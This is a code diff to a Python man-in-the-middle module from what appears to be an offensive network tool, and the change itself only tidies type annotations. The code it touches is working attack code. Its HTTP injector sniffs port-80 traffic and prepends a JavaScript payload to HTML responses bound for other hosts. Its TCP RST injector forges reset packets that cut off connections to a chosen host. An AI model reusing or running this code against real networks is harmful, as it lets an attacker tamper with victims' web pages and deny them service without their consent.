@@ -11,28 +11,28 @@ from __future__ import annotations
 import re
 import socket
 import time
-from typing import TYPE_CHECKING
+from typing import TYPE_CHECKING, Any
 
 from core.mitm._scapy import Raw, TCP, IP, sniff, sendp, send, conf
 
 if TYPE_CHECKING:
-    from PySide6.QtCore import Signal
+    from PySide6.QtCore import SignalInstance
 
 
 # ── HTTP Injector ──────────────────────────────────────────────────────────────
 
 def _inject_http_payload(
-    packet: object,
-    passive_log_signal: Signal,  # type: ignore[type-arg]
+    packet: Any,
+    passive_log_signal: SignalInstance,
 ) -> None:
     try:
         if (
-            not packet.haslayer(Raw)  # type: ignore[union-attr]
+            not packet.haslayer(Raw)
             or not packet.haslayer(TCP)
             or not packet.haslayer(IP)
         ):
             return
-        payload = packet[Raw].load  # type: ignore[index]
+        payload = packet[Raw].load
         if b"S.P.E.C.T.R.E." in payload:
             return
         if b"HTTP/1." in payload and b"text/html" in payload.lower():
@@ -44,27 +44,28 @@ def _inject_http_payload(
                 new_body = js_payload + body
                 headers = re.sub(rb"(?i)Content-Length:\s*\d+\r\n", b"", headers)
                 headers += f"Content-Length: {len(new_body)}\r\n".encode()
-                packet[Raw].load = headers + b"\r\n\r\n" + new_body  # type: ignore[index]
-                del packet[IP].len  # type: ignore[index]
-                del packet[IP].chksum  # type: ignore[index]
-                del packet[TCP].chksum  # type: ignore[index]
-                sendp(packet, verbose=0)
+                packet[Raw].load = headers + b"\r\n\r\n" + new_body
+                del packet[IP].len
+                del packet[IP].chksum
+                del packet[TCP].chksum
+                sendp(packet, verbose=0)  # type: ignore[misc]
                 passive_log_signal.emit(
-                    f"💉 Injected JS payload to {packet[IP].dst}", "DATA"  # type: ignore[index]
+                    f"💉 Injected JS payload to {packet[IP].dst}", "DATA"
                 )
     except Exception as e:
         passive_log_signal.emit(f" Injection Error: {str(e)}", "CRIT")
 
 
 def run_http_injector(
-    running_flag: list[bool],
-    passive_log_signal: Signal,  # type: ignore[type-arg]
+    running_flag: list[bool], passive_log_signal: SignalInstance
 ) -> None:
     """Intercept HTTP HTML responses and inject a JS payload."""
     passive_log_signal.emit("HTTP Injector Active. Modifying HTML payloads...", "INFO")
     while running_flag[0]:
         try:
-            sniff(
+            if conf is None or conf.iface is None:
+                break
+            sniff(  # type: ignore[misc]
                 filter="tcp port 80",
                 iface=conf.iface,
                 prn=lambda pkt: _inject_http_payload(pkt, passive_log_signal),
@@ -78,7 +79,7 @@ def run_http_injector(
 
 # ── TCP RST Injector ───────────────────────────────────────────────────────────
 
-def _resolve_target(block_target: str, passive_log_signal: Signal) -> set[str] | None:  # type: ignore[type-arg]
+def _resolve_target(block_target: str, passive_log_signal: SignalInstance) -> set[str] | None:
     """Resolve block_target (IP or domain) to a set of IPs. Returns None on failure."""
     blocked_ips: set[str] = set()
     try:
@@ -99,34 +100,34 @@ def _resolve_target(block_target: str, passive_log_signal: Signal) -> set[str] |
 
 
 def _inject_rst_packet(
-    packet: object,
+    packet: Any,
     blocked_ips: set[str],
     block_target: str,
-    passive_log_signal: Signal,  # type: ignore[type-arg]
+    passive_log_signal: SignalInstance,
 ) -> None:
     try:
-        if not packet.haslayer(IP) or not packet.haslayer(TCP):  # type: ignore[union-attr]
+        if not packet.haslayer(IP) or not packet.haslayer(TCP):
             return
-        src_ip = packet[IP].src  # type: ignore[index]
-        dst_ip = packet[IP].dst  # type: ignore[index]
-        sport = packet[TCP].sport  # type: ignore[index]
-        dport = packet[TCP].dport  # type: ignore[index]
-        seq = packet[TCP].seq  # type: ignore[index]
-        ack = packet[TCP].ack  # type: ignore[index]
+        src_ip = packet[IP].src
+        dst_ip = packet[IP].dst
+        sport = packet[TCP].sport
+        dport = packet[TCP].dport
+        seq = packet[TCP].seq
+        ack = packet[TCP].ack
 
         is_blocked = dst_ip in blocked_ips or src_ip in blocked_ips
         if not is_blocked and block_target and packet.haslayer(Raw):
-            payload_str = packet[Raw].load.decode("utf-8", errors="ignore").lower()  # type: ignore[index]
+            payload_str = packet[Raw].load.decode("utf-8", errors="ignore").lower()
             if block_target in payload_str:
                 is_blocked = True
 
         if is_blocked:
-            payload_len = len(packet[Raw].load) if packet.haslayer(Raw) else 0  # type: ignore[index, union-attr]
+            payload_len = len(packet[Raw].load) if packet.haslayer(Raw) else 0
             next_seq = seq + payload_len
-            rst_same = IP(src=src_ip, dst=dst_ip) / TCP(sport=sport, dport=dport, flags="R", seq=next_seq)
-            send(rst_same, verbose=0)
-            rst_opp = IP(src=dst_ip, dst=src_ip) / TCP(sport=dport, dport=sport, flags="R", seq=ack)
-            send(rst_opp, verbose=0)
+            rst_same = IP(src=src_ip, dst=dst_ip) / TCP(sport=sport, dport=dport, flags="R", seq=next_seq)  # type: ignore[misc, operator]
+            send(rst_same, verbose=0)  # type: ignore[misc]
+            rst_opp = IP(src=dst_ip, dst=src_ip) / TCP(sport=dport, dport=sport, flags="R", seq=ack)  # type: ignore[misc, operator]
+            send(rst_opp, verbose=0)  # type: ignore[misc]
             passive_log_signal.emit(
                 f"🛑 TCP RST INJECTED: {src_ip}:{sport} <-> {dst_ip}:{dport} "
                 f"(Killed connection to {block_target})",
@@ -139,7 +140,7 @@ def _inject_rst_packet(
 def run_tcp_rst_injector(
     block_target: str,
     running_flag: list[bool],
-    passive_log_signal: Signal,  # type: ignore[type-arg]
+    passive_log_signal: SignalInstance,
 ) -> None:
     """Forge TCP RST packets to kill connections to a specific host."""
     if not block_target:
@@ -153,7 +154,9 @@ def run_tcp_rst_injector(
     passive_log_signal.emit("Listening on TCP Port 80 & 443...", "INFO")
     while running_flag[0]:
         try:
-            sniff(
+            if conf is None or conf.iface is None:
+                break
+            sniff(  # type: ignore[misc]
                 filter="tcp port 80 or tcp port 443",
                 iface=conf.iface,
                 prn=lambda pkt: _inject_rst_packet(pkt, blocked_ips, block_target, passive_log_signal),
